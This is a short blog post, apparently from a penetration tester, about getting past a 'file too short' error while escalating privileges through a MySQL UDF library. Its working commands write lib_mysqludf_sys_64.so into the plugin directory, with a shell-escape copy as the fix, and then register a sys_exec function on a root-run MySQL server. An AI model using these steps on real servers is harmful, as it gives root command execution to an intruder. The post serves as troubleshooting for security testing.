---
title: "MySQL Error "file too short" when creating sys_exec function"
layout: post
published: true
---

I’ve recently encountered an interesting error “file too short” when escalating privileges on a Linux box via MySQL Library (lib_mysqludf_sys_64.so).

```bash
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/tmp/lib_mysqludf_sys_64.so'));

mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so';

mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';

ERROR 1126 (HY000): Can't open shared library 'lib_mysqludf_sys_64.so' 
(errno: 11 /usr/lib/mysql/plugin/lib_mysqludf_sys_64.so: file too short)
```


Turned out that “SELECT … INTO DUMPFILE” clause did not write a library properly into plugins’ directory in “/usr/lib/mysql/plugin/” (the file size is 1)


### Solution
MySQL is running as root so we can try to copy the file manually via breaking into a shell 

```bash
mysql> \! cp lib_mysqludf_sys_64.so /usr/lib/mysql/plugin/

mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';
Query OK, 0 rows affected (0.00 sec)
```

### Software version details

- Database version MySQL 5.7.30 
- mysql process is running as a root
- OS: Debian 9.12 (stretch) x86_64

Cheers,</br>
bitsailor